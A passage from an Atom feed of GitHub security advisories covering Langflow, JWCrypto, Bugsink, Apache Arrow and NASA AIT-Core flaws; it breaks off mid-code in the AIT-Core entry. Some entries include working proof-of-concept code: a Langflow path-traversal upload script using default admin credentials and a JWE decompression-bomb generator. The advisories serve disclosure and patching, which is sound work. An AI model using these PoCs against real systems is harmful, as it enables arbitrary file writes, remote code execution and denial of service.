<p>This defense-in-depth failure leaves the <code>POST /api/v2/files/</code> endpoint vulnerable to Arbitrary File Write. The multipart upload filename bypasses the path-parameter guard, allowing authenticated attackers to write files anywhere on the host system, leading to Remote Code Execution (RCE).</p>
<h3 id="details">Details</h3>
<p>The vulnerability exists in two layers:</p>
<ol>
<li><strong>API Layer (<code>src/backend/base/langflow/api/v2/files.py:162</code>)</strong>: Inside the <code>upload_user_file</code> route, the <code>filename</code> is extracted directly from the multipart <code>Content-Disposition</code> header (<code>new_filename = file.filename</code>). It is passed verbatim to the storage service. <code>ValidatedFileName</code> provides zero protection here as it only guards URL path parameters.</li>
<li><strong>Storage Layer (<code>src/backend/base/langflow/services/storage/local.py:114-116</code>)</strong>: The <code>LocalStorageService</code> uses naive path concatenation (<code>file_path = folder_path / file_name</code>). It lacks a <code>resolve().is_relative_to(base_dir)</code> containment check.</li>
</ol>
<p><strong>Recommended Fix:</strong></p>
<ol>
<li>Sanitize the multipart filename before processing:</li>
</ol>
<pre><code class="language-python">from pathlib import Path as StdPath
new_filename = StdPath(file.filename or "").name # Strips directory traversal characters
if not new_filename or ".." in new_filename:
    raise HTTPException(status_code=400, detail="Invalid file name")
</code></pre>
<ol start="2">
<li>Add a canonical path containment check inside <code>LocalStorageService.save_file</code> to permanently kill this vulnerability class.</li>
</ol>
<h3 id="poc">PoC</h3>
<p>This Python script verifies the vulnerability against <code>langflowai/langflow:latest</code> (v1.7.3) by writing a file outside the user's UUID storage directory.</p>
<pre><code class="language-python">import requests

BASE_URL = "http://localhost:7860"
# Authenticate to get a valid JWT
token = requests.post(f"{BASE_URL}/api/v1/login", data={"username": "admin", "password": "admin"}).json()["access_token"]

# Payload using directory traversal in the multipart filename
TRAVERSAL_FILENAME = "../../traversal_proof.txt"
SENTINEL_CONTENT = b"CVE_RESEARCH_SENTINEL_KEY"

resp = requests.post(
    f"{BASE_URL}/api/v2/files/",
    headers={"Authorization": f"Bearer {token}"},
    files={"file": (TRAVERSAL_FILENAME, SENTINEL_CONTENT, "text/plain")},
)

print(f"Status: {resp.status_code}") # Returns 201
# The file is successfully written to `/app/data/.cache/langflow/traversal_proof.txt`
</code></pre>
<p>Server Logs:</p>
<pre><code>2026-02-19T10:04:54.031888Z [info     ] File ../traversal_proof.txt saved successfully in flow 3668bcce-db6c-4f58-834c-f49ba0024fcb.
2026-02-19T10:05:51.792520Z [info     ] File secret_image.png saved successfully in flow 3668bcce-db6c-4f58-834c-f49ba0024fcb.
</code></pre>
<p>Docker cntainer file:</p>
<pre><code>user@40416f6848f2:~/.cache/langflow$ ls
3668bcce-db6c-4f58-834c-f49ba0024fcb  profile_pictures	secret_key  traversal_proof.txt
</code></pre>
<h3 id="impact">Impact</h3>
<p>Authenticated Arbitrary File Write. An attacker can overwrite critical system files, inject malicious Python components, or overwrite <code>.ssh/authorized_keys</code> to achieve full Remote Code Execution on the host server.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-g2j9-7rj2-gm6c">https://github.com/langflow-ai/langflow/security/advisories/GHSA-g2j9-7rj2-gm6c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-33309">https://nvd.nist.gov/vuln/detail/CVE-2026-33309</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-79.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-79.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-g2j9-7rj2-gm6c">https://github.com/advisories/GHSA-g2j9-7rj2-gm6c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g2j9-7rj2-gm6c</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2026-03-19T17:46:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[langflow] Langflow is Missing Ownership Verification in API Key Deletion (IDOR)]]></title>
        <id>https://github.com/advisories/GHSA-rf6x-r45m-xv3w</id>
        <link href="https://github.com/advisories/GHSA-rf6x-r45m-xv3w"/>
        <updated>2026-06-06T00:55:20.000Z</updated>
        <content type="html"><![CDATA[<p><strong>Detection Method:</strong> Kolega.dev Deep Code Scan</p>
<table>
<thead>
<tr>
<th>Attribute</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>Location</td>
<td>src/backend/base/langflow/api/v1/api_key.py:44-53</td>
</tr>
<tr>
<td>Practical Exploitability</td>
<td>High</td>
</tr>
<tr>
<td>Developer Approver</td>
<td><a href="mailto:faizan@kolega.ai">faizan@kolega.ai</a></td>
</tr>
</tbody></table>
<h3 id="description">Description</h3>
<p>The delete_api_key_route() endpoint accepts an api_key_id path parameter and deletes it with only a generic authentication check (get_current_active_user dependency). However, the delete_api_key() CRUD function does NOT verify that the API key belongs to the current user before deletion.</p>
<h3 id="affected-code">Affected Code</h3>
<pre><code>@router.delete("/{api_key_id}", dependencies=[Depends(auth_utils.get_current_active_user)])
async def delete_api_key_route(
    api_key_id: UUID,
    db: DbSession,
):
    try:
        await delete_api_key(db, api_key_id)
    except Exception as e:
        raise HTTPException(status_code=400, detail=str(e)) from e
    return {"detail": "API Key deleted"}
</code></pre>
<h3 id="evidence">Evidence</h3>
<p>In crud.py lines 44-49, delete_api_key() retrieves the API key by ID and deletes it without checking if the key belongs to the authenticated user. The endpoint also doesn't pass the current_user to the delete function for verification.</p>
<h3 id="impact">Impact</h3>
<p>An authenticated attacker can enumerate and delete API keys belonging to other users by guessing or discovering their API key IDs. This allows account takeover, denial of service, and disruption of other users' integrations.</p>
<h3 id="recommendation">Recommendation</h3>
<p>Modify the delete_api_key endpoint and function: (1) Pass current_user to the delete function; (2) In delete_api_key(), verify api_key.user_id == current_user.id before deletion; (3) Raise a 403 Forbidden error if the user doesn't own the key. Example: if api_key.user_id != user_id: raise HTTPException(status_code=403, detail='Unauthorized')</p>
<h3 id="notes">Notes</h3>
<p>Confirmed IDOR vulnerability. The delete_api_key_route endpoint at line 44-53 accepts an api_key_id and calls delete_api_key(db, api_key_id) without passing the current_user. The CRUD function delete_api_key() at crud.py:44-49 retrieves the API key by ID and deletes it without verifying ownership (api_key.user_id == current_user.id). Compare this to the GET endpoint at lines 17-28 which correctly filters by user_id, and the POST endpoint at lines 31-41 which correctly associates the key with user_id. An authenticated attacker can delete any user's API keys by guessing/enumerating UUIDs. Fix: Pass current_user to delete_api_key and verify api_key.user_id == current_user.id before deletion, returning 403 if unauthorized.</p>
<h3 id="developer-review-notes">Developer Review Notes</h3>
<p>Does not accept current_user as a parameter. Allowing deletion of any user's API keys even without permissions.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/langflow-ai/langflow/security/advisories/GHSA-rf6x-r45m-xv3w">https://github.com/langflow-ai/langflow/security/advisories/GHSA-rf6x-r45m-xv3w</a></li>
<li><a href="https://github.com/langflow-ai/langflow/commit/fdc1b3b1448ff3317d73d3e769a6c4a1717f74d7">https://github.com/langflow-ai/langflow/commit/fdc1b3b1448ff3317d73d3e769a6c4a1717f74d7</a></li>
<li><a href="https://github.com/langflow-ai/langflow/releases/tag/1.7.2">https://github.com/langflow-ai/langflow/releases/tag/1.7.2</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-78.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/langflow/PYSEC-2026-78.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-rf6x-r45m-xv3w">https://github.com/advisories/GHSA-rf6x-r45m-xv3w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rf6x-r45m-xv3w</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-03-18T12:58:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jwcrypto] JWCrypto: JWE ZIP decompression bomb]]></title>
        <id>https://github.com/advisories/GHSA-fjrm-76x2-c4q4</id>
        <link href="https://github.com/advisories/GHSA-fjrm-76x2-c4q4"/>
        <updated>2026-06-06T00:25:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The fix for GHSA-j857-7rvv-vj97 in v1.5.6 is weak in that it does not allow to fully control the amount of plaintext the receiver is willing to deal with and provides just a weak upper bound. The patch limits input token size to 250KB but does not validate the decompressed output size. An unauthenticated attacker can craft a JWE token under the 250KB input limit that decompresses to very large data that may exceed small devices memory availability, causing Denial of Service via memory exhaustion.</p>
<p>Although this is technically not unbounded I do recognize that it may be too much for devices and is something that could be surprising to developers, and we can do better than that.</p>
<p>NOTE: the original report was sloppy (probably AI slop) and claimed arbitrary memory consumption, but simple testing showed that while 100MB could be decompressed a 1GB output was denied because the token exceeded the 250K compressed serialization.</p>
<p>NOTE WELL: The proposed solution was also sloppy, proposing to first decompress the data completely in memory (therefore causing the memory exhaustion) and then checking how much memory was already used to deny the operation. I <em>intentionally</em> left the "details" section untouched to show how bad AI slop is and how <em>uncritical</em> the submitter was, even as it was obvious the "suggested fix" is actually no solution at all, as it was using the very call that he claimed was causing "arbitrary" memory exhaustion and wrapping it around an "if" ... the actual solution is in the resolving commit in version 1.5.7</p>
<h3 id="details">Details</h3>
<p>The vulnerable code in <code>jwcrypto/jwe.py</code>:</p>
<pre><code class="language-python">if len(data) &gt; default_max_compressed_size:
    raise InvalidJWEData('Compressed data exceeds maximum allowed size')
self.plaintext = zlib.decompress(data, -zlib.MAX_WBITS)
</code></pre>
<p>The check validates <code>data</code> which is the <strong>compressed</strong> bytes, not the decompressed output. A 132KB token (under the 250KB limit) can decompress to approximately 100MB with no error raised.</p>
<h3 id="poc">PoC</h3>
<p>Tested on jwcrypto 1.5.6 (patched version):</p>
<pre><code class="language-python">import zlib
from jwcrypto import jwe
from jwcrypto.jwk import JWK
import time

key = JWK.generate(kty='oct', size=128)
bomb_data = b"A" * 1024 * 1024 * 100  # 100MB uncompressed

token = jwe.JWE(
    plaintext=bomb_data,
    protected={"alg": "A128KW", "enc": "A128GCM", "zip": "DEF"}
)
token.add_recipient(key)
serialized = token.serialize(compact=True)
print(f"Token size: {len(serialized)/1024:.1f} KB")  # 132.8 KB — under 250KB limit

tok2 = jwe.JWE()
tok2.deserialize(serialized, key)
print(f"Decompressed: {len(tok2.plaintext)/1024/1024:.0f} MB")  # 100 MB
</code></pre>
<p>Output:</p>
<pre><code>Token size: 132.8 KB
Decompressed: 100 MB
</code></pre>
<h3 id="impact">Impact</h3>
<p>An unauthenticated attacker can exhaust server memory by sending crafted JWE tokens with ZIP compression. The existing patch (v1.5.6) does not prevent this attack. An unauthenticated attacker can cause memory exhaustion on memory-constrained systems. A token under the 250KB input limit can decompress to approximately 100MB.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/latchset/jwcrypto/security/advisories/GHSA-fjrm-76x2-c4q4">https://github.com/latchset/jwcrypto/security/advisories/GHSA-fjrm-76x2-c4q4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-39373">https://nvd.nist.gov/vuln/detail/CVE-2026-39373</a></li>
<li><a href="https://github.com/latchset/jwcrypto/commit/25db861d8b29434838669a94a843af03d29ea6ed">https://github.com/latchset/jwcrypto/commit/25db861d8b29434838669a94a843af03d29ea6ed</a></li>
<li><a href="https://github.com/latchset/jwcrypto/releases/tag/v1.5.7">https://github.com/latchset/jwcrypto/releases/tag/v1.5.7</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/jwcrypto/PYSEC-2026-70.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/jwcrypto/PYSEC-2026-70.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-fjrm-76x2-c4q4">https://github.com/advisories/GHSA-fjrm-76x2-c4q4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fjrm-76x2-c4q4</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-04-08T00:16:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bugsink] Bugsink: DOS using large numbers of event tags]]></title>
        <id>https://github.com/advisories/GHSA-5x67-j5xg-c5gj</id>
        <link href="https://github.com/advisories/GHSA-5x67-j5xg-c5gj"/>
        <updated>2026-06-05T21:45:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In affected versions, Bugsink stores every tag supplied with an incoming event. An event with an unusually large number
of custom (i.e. supplied by an attacker) tags can therefore make ingestion spend more time than intended writing tag rows.</p>
<p>Bugsink uses a single-writer database architecture. That keeps the implementation simple, but it also means one
expensive write transaction can delay other event digestion while it is running. In this case, it makes ingestion of
other events wait until the transaction that writes the tags finishes, which effectively causes a temporary denial of
service for other events.</p>
<h3 id="impact">Impact</h3>
<p>Submitting such an event requires a valid project DSN. DSNs are sometimes visible in client-side applications, so they
should not be treated as a strong security boundary, but the issue is still limited to ingestion for a Bugsink instance
that accepts the event.</p>
<p>The impact is availability-only. The issue does not expose stored data, modify existing events, or allow code execution.</p>
<h3 id="mitigation">Mitigation</h3>
<p>Update to version 2.2.2, which caps the number of tags stored for a single event. The default cap is 100 tags and can
be changed with <code>MAX_EVENT_TAGS</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bugsink/bugsink/security/advisories/GHSA-5x67-j5xg-c5gj">https://github.com/bugsink/bugsink/security/advisories/GHSA-5x67-j5xg-c5gj</a></li>
<li><a href="https://github.com/bugsink/bugsink/releases/tag/2.2.2">https://github.com/bugsink/bugsink/releases/tag/2.2.2</a></li>
<li><a href="https://github.com/advisories/GHSA-5x67-j5xg-c5gj">https://github.com/advisories/GHSA-5x67-j5xg-c5gj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5x67-j5xg-c5gj</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-05T21:45:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bugsink] Bugsink: Project scoping missing in sourcemap and debug-file lookup]]></title>
        <id>https://github.com/advisories/GHSA-5389-f7vh-wxj8</id>
        <link href="https://github.com/advisories/GHSA-5389-f7vh-wxj8"/>
        <updated>2026-06-05T21:44:37.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Bugsink before 2.2.0 resolved sourcemaps and debug files by debug ID without scoping that lookup to the project that owned the uploaded metadata. An authenticated user with access to one project could cause event processing in that project to use sourcemap/debug-file metadata uploaded for another project in the same Bugsink instance, if the same debug ID was referenced.</p>
<h3 id="impact">Impact</h3>
<p>This could disclose source context or symbolication-derived context from another project on the same Bugsink instance.</p>
<p>For sourcemaps, the documented upload flow used <code>sentry-cli sourcemaps upload</code> with <code>--project=ignoredfornow</code>. In other words, Bugsink did not historically treat the project value supplied during sourcemap upload as meaningful project ownership. This was documented, but at the same time the <code>sentry-cli</code>, which requires project as a parameter, was the recommended mechanism for uploads. This could reasonably lead people to expect that sourcemaps uploads would respect the provided project-boundary.</p>
<p>For minidumps/debug files specifically, the affected functionality also required <code>FEATURE_MINIDUMPS</code> to be enabled. That feature was marked experimental.</p>
<p>The practical impact is further limited by Bugsink’s deployment model: self-hosted instances are commonly operated within a single organization/trust domain, and Hosted Bugsink uses separate Bugsink instances per tenant. The issue does not cross Hosted Bugsink tenant boundaries.</p>
<h3 id="affected-versions">Affected Versions</h3>
<p>2.1.3 and earlier are affected.</p>
<h3 id="patched-versions">Patched Versions</h3>
<p>2.2.0 fixes this issue.</p>
<h3 id="post-upgrade-notes">Post-Upgrade Notes</h3>
<p>After upgrading, upload sourcemaps/debug files with project information.</p>
<p>To remove legacy projectless sourcemap metadata immediately, run, after upgrading:</p>
<pre><code>bugsink-manage delete_legacy_sourcemaps
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bugsink/bugsink/security/advisories/GHSA-5389-f7vh-wxj8">https://github.com/bugsink/bugsink/security/advisories/GHSA-5389-f7vh-wxj8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47728">https://nvd.nist.gov/vuln/detail/CVE-2026-47728</a></li>
<li><a href="https://github.com/bugsink/bugsink/releases/tag/2.2.0">https://github.com/bugsink/bugsink/releases/tag/2.2.0</a></li>
<li><a href="https://github.com/advisories/GHSA-5389-f7vh-wxj8">https://github.com/advisories/GHSA-5389-f7vh-wxj8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5389-f7vh-wxj8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-05T21:44:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bugsink] Bugsink: Issue bulk actions can affect another project’s issue if its UUID is known]]></title>
        <id>https://github.com/advisories/GHSA-g5vc-q7qc-v939</id>
        <link href="https://github.com/advisories/GHSA-g5vc-q7qc-v939"/>
        <updated>2026-06-05T21:43:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Bugsink’s issue list supports bulk actions such as resolving or muting selected issues. In affected versions, the issue list view authorizes access through the project in the URL, but applies the requested bulk action to the submitted issue IDs without also requiring those issues to belong to that project.</p>
<p>This is a project-boundary authorization issue: a logged-in user with access to one project can change the state of an issue in another project. However, the issue is mitigated by two factors. First, the attacker needs to already know a valid target issue UUID; there is no issue enumeration path here, and guessing UUIDs is not practical. Second, Bugsink is commonly self-hosted within a single trust domain, and Hosted Bugsink gives each tenant a separate Bugsink instance, so cross-project access does not normally imply cross-tenant access.</p>
<p>This has been fixed by requiring bulk issue actions to operate only on issues belonging to the authorized project.</p>
<h3 id="impact">Impact</h3>
<p>Low-severity cross-project issue state modification, requiring authentication and prior knowledge of a valid issue UUID.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bugsink/bugsink/security/advisories/GHSA-g5vc-q7qc-v939">https://github.com/bugsink/bugsink/security/advisories/GHSA-g5vc-q7qc-v939</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47716">https://nvd.nist.gov/vuln/detail/CVE-2026-47716</a></li>
<li><a href="https://github.com/bugsink/bugsink/releases/tag/2.2.0">https://github.com/bugsink/bugsink/releases/tag/2.2.0</a></li>
<li><a href="https://github.com/advisories/GHSA-g5vc-q7qc-v939">https://github.com/advisories/GHSA-g5vc-q7qc-v939</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g5vc-q7qc-v939</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-05T21:43:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bugsink] Bugsink: Issue event views can show an event from another project if its UUID is known]]></title>
        <id>https://github.com/advisories/GHSA-vx2f-6m6h-9frf</id>
        <link href="https://github.com/advisories/GHSA-vx2f-6m6h-9frf"/>
        <updated>2026-06-05T21:43:26.000Z</updated>
        <content type="html"><![CDATA[<h3 id="description">Description</h3>
<p>Bugsink issue event pages accept a direct event identifier from the URL and, in affected versions, look up that event without also requiring it to belong to the issue in the URL.</p>
<p>This is a project-boundary authorization issue: a logged-in user with access to one project can view another project’s event data through an issue they are allowed to access. However, the issue is mitigated by two factors. First, the attacker needs to already know a valid target event UUID; there is no event enumeration path here, and guessing UUIDs is not practical. Second, Bugsink is commonly self-hosted within a single trust domain, and Hosted Bugsink gives each tenant a separate Bugsink instance, so cross-project access does not normally imply cross-tenant access.</p>
<p>The affected views include the stacktrace, details, and breadcrumbs pages for an issue event.</p>
<p>This has been fixed by requiring direct event lookups to match both the authorized issue and the project.</p>
<h3 id="impact">Impact</h3>
<p>Low-severity cross-project event data exposure, requiring authentication and prior knowledge of a valid event UUID.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/bugsink/bugsink/security/advisories/GHSA-vx2f-6m6h-9frf">https://github.com/bugsink/bugsink/security/advisories/GHSA-vx2f-6m6h-9frf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-47715">https://nvd.nist.gov/vuln/detail/CVE-2026-47715</a></li>
<li><a href="https://github.com/bugsink/bugsink/releases/tag/2.2.0">https://github.com/bugsink/bugsink/releases/tag/2.2.0</a></li>
<li><a href="https://github.com/advisories/GHSA-vx2f-6m6h-9frf">https://github.com/advisories/GHSA-vx2f-6m6h-9frf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vx2f-6m6h-9frf</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2026-06-05T21:43:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pyarrow] Apache Arrow: Potential use-after-free when reading IPC file with pre-buffering]]></title>
        <id>https://github.com/advisories/GHSA-rgxp-2hwp-jwgg</id>
        <link href="https://github.com/advisories/GHSA-rgxp-2hwp-jwgg"/>
        <updated>2026-06-05T21:39:36.000Z</updated>
        <content type="html"><![CDATA[<p>Use After Free vulnerability in Apache Arrow C++.</p>
<p>This issue affects Apache Arrow C++ from 15.0.0 through 23.0.0. It can be triggered when reading an Arrow IPC file (but not an IPC stream) with pre-buffering enabled, if the IPC file contains data with variadic buffers (such as Binary View and String View data). Depending on the number of variadic buffers in a record batch column and on the temporal sequence of multi-threaded IO, a write to a dangling pointer could occur. The value (a <code>std::shared_ptr&lt;Buffer&gt;</code> object)&nbsp;that is written to the dangling pointer is not under direct control of the attacker.</p>
<p>Pre-buffering is disabled by default but can be enabled using a specific C++ API call (<code>RecordBatchFileReader::PreBufferMetadata</code>). The functionality is not exposed in language bindings (Python, Ruby, C GLib), so these bindings are not vulnerable.</p>
<p>The most likely consequence of this issue would be random crashes or memory corruption when reading specific kinds of IPC files. If the application allows ingesting IPC files from untrusted sources, this could plausibly be exploited for denial of service. Inducing more targeted kinds of misbehavior (such as confidential data extraction from the running process) depends on memory allocation and multi-threaded IO temporal patterns that are unlikely to be easily controlled by an attacker.</p>
<p>Advice for users of Arrow C++:</p>
<ol>
<li><p>check whether you enable pre-buffering on the IPC file reader (using&nbsp;<code>RecordBatchFileReader::PreBufferMetadata</code>)</p>
</li>
<li><p>if so, either disable pre-buffering (which may have adverse performance consequences), or switch to Arrow 23.0.1 which is not vulnerable</p>
</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-25087">https://nvd.nist.gov/vuln/detail/CVE-2026-25087</a></li>
<li><a href="https://github.com/apache/arrow/pull/48925">https://github.com/apache/arrow/pull/48925</a></li>
<li><a href="https://lists.apache.org/thread/mpm4ld1qony30tchfpjtk5b11tcyvmwh">https://lists.apache.org/thread/mpm4ld1qony30tchfpjtk5b11tcyvmwh</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2026/02/17/4">http://www.openwall.com/lists/oss-security/2026/02/17/4</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/pyarrow/PYSEC-2026-113.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/pyarrow/PYSEC-2026-113.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-rgxp-2hwp-jwgg">https://github.com/advisories/GHSA-rgxp-2hwp-jwgg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rgxp-2hwp-jwgg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-02-17T15:31:35.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[ait-core] NASA AMMOS Instrument Toolkit: Path traversal resulting in arbitrary file append (can be triggered over the network by unauthenticated attacker)]]></title>
        <id>https://github.com/advisories/GHSA-p462-prxw-mjx4</id>
        <link href="https://github.com/advisories/GHSA-p462-prxw-mjx4"/>
        <updated>2026-06-05T18:11:28.000Z</updated>
        <content type="html"><![CDATA[<h2 id="1-summary">1. Summary</h2>
<p>The Binary Stream Capture (BSC) component exposes an unauthenticated HTTP API for dynamically creating packet capture “handlers.” Because the code blindly trusts path‑related form fields, a remote client can:</p>
<ul>
<li><strong>Bypass the configured log root</strong> and direct BSC to log to <strong>arbitrary filesystem paths</strong> (path traversal / directory escape), and</li>
<li><strong>Append attacker‑controlled data</strong> to those files, using the privileges of the<code>ait-bsc</code> process.</li>
</ul>
<p>There are two ways for a remote attacker to trigger this:</p>
<ol>
<li>If the attacker has access to the network where <code>ait-bsc</code> is deployed (a reason for that could be that the ports are publicly accessible), the payloads can be directly sent to the server to trigger the arbitrary file append. This type of attack is demonstrated in <code>python_poc.py</code>.</li>
<li>Even if the attacker does not have direct access to the network because the software is running in a local network, it is possible to exploit this if a bad actor in that network opens an attacker-controlled website (which might be a website created by an attacker, or a third-party website compromised by the attacker). The browser javascript can automatically send the requests necessary to exploit this into the local network. This is even possible if the server is only accessible on <code>localhost</code>. This type of attack is demonstrated by <code>attacker_tcp.py</code> and <code>test1.html</code> (first launch the attacker TCP server, then start a webserver to host <code>test1.html</code>, for example using <code>python3 -m http.server 7000</code>,
 and open <code>test1.html</code>).</li>
</ol>
<h3 id="impact">Impact</h3>
<p>This issue affects BSC (Binary Stream Capture) and usage of the ait-bsc server. This impacts AIT-Core versions before 3.1.1, from 2.x before 2.6.1. Users are recommended to upgrade to version 3.1.1 or 2.6.1.</p>
<h4 id="details">Details</h4>
<p>A remote attacker can use this vulnerability to append data to arbitrary files on the system (if the <code>ait-bsc</code> has privileges to write to them). It is easy to use this to corrupt data on the system (which can include the AIT-Core python code to crash the server after it is restarted and python attempts to execute the corrupted code). It should be mentioned here that there seems to be a bug in the TCP handler that results in a lot of data being written in an infinite loop after the connection has been closed, this could result in excessive disk space use. That the attacker can modify executable files like python or bash scripts means that this vulnerability could also lead to Remote Code Execution as soon as the user runs the modified code. However, depending on the system, it is not so easy to execute this attack in practice (it might not be possible), because <code>ait-bsc</code> adds a header in front of attacker-controlled data. </p>
<h3 id="fix-information">Fix Information</h3>
<p>The vulnerability is mitigated by constraining BSC ability to write paths only in the project root log directory which is configured through the bsc.yaml. Additionally, any attempts to traverse outside of the configured location are rejected.</p>
<h3 id="patches">Patches</h3>
<ul>
<li>3.1.1</li>
<li>2.6.1</li>
</ul>
<hr>
<h2 id="2-affected-code-paths">2. Affected Code Paths</h2>
<h3 id="21-rest-entry-point-namestart">2.1 REST entry point: <code>/NAME/start</code></h3>
<p><code>StreamCaptureManagerServer</code> exposes an unauthenticated POST endpoint:</p>
<pre><code class="language-python"># ait/core/bsc.py

class StreamCaptureManagerServer(Bottle):
    def _route(self):
        self._app.route("/", method="GET", callback=self._get_logger_list)
        self._app.route("/stats", method="GET", callback=self._fetch_handler_stats)
        self._app.route(
            "/&lt;name&gt;/start", method="POST", callback=self._add_logger_by_name
        )
        self._app.route(
            "/&lt;name&gt;/stop", method="DELETE", callback=self._stop_logger_by_name
        )
        ...
</code></pre>
<p>Handler:</p>
<pre><code class="language-python">def _add_logger_by_name(self, name):
    ...
    data = dict(request.forms)
    loc = data.pop("loc", "")
    port = data.pop("port", None)
    conn_type = data.pop("conn_type", None)

    if not port or not conn_type:
        raise ValueError("Port and/or conn_type not set")

    address = [loc, int(port)]

    if "rotate_log" in data:
        data["rotate_log"] = True if data == "true" else False

    if "rotate_log_delta" in data:
        data["rotate_log_delta"] = int(data["rotate_log_delta"])

    self._logger_manager.add_logger(name, address, conn_type, **data)
</code></pre>
<p>All form fields except <code>loc</code>, <code>port</code>, <code>conn_type</code> are passed directly as <code>**data</code> into add_logger.
This includes attacker‑controlled <code>path</code>, <code>file_name_pattern</code>, and potentially <code>log_dir_path</code>.
There is no authentication on this route.</p>
<h3 id="22-manager-unvalidated-path-and-log_dir_path">2.2 Manager: unvalidated <code>path</code> and <code>log_dir_path</code></h3>
<p><code>StreamCaptureManager.add_logger</code>:</p>
<pre><code class="language-python"># ait/core/bsc.py

def add_logger(self, name, address, conn_type, log_dir_path=None, **kwargs):
    capture_handler_conf = kwargs

    if not log_dir_path:
        log_dir_path = self._mngr_conf["root_log_directory"]

    log_dir_path = os.path.normpath(os.path.expanduser(log_dir_path))

    capture_handler_conf["log_dir"] = log_dir_path
    capture_handler_conf["name"] = name
    if "rotate_log" not in capture_handler_conf:
        capture_handler_conf["rotate_log"] = True

    ...
    address_key = str(address)
    if address_key in self._stream_capturers:
        capturer = self._stream_capturers[address_key][0]
        capturer.add_handler(capture_handler_conf)
        return

    socket_logger = SocketStreamCapturer(capture_handler_conf, address, conn_type)
    greenlet = gevent.spawn(socket_logger.socket_monitor_loop)
    self._stream_capturers[address_key] = (socket_logger, greenlet)
    self._pool.add(greenlet)
</code></pre>
<p>Key points:</p>
<ul>
<li>If the REST client supplies <code>log_dir_path</code> explicitly (as a named parameter), it overrides the manager’s <code>root_log_directory</code>.</li>
<li>All other attacker‑supplied fields in <code>kwargs</code> become part of the handler configuration dict (<code>capture_handler_conf</code>), including <code>path</code> and <code>file_name_pattern</code>.</li>
<li>There is <strong>no</strong> check that <code>log_dir_path</code> or <code>path</code> are relative or confined.</li>
</ul>
<h3 id="23-path-traversal-via-_get_log_file">2.3 Path traversal via <code>_get_log_file</code></h3>
<p><code>SocketStreamCapturer._get_log_file</code> builds the actual log path:</p>
<pre><code class="language-python"># ait/core/bsc.py

def _get_log_file(self, handler):
    """Generate log file path for a given handler"""
    if "file_name_pattern" not in handler:
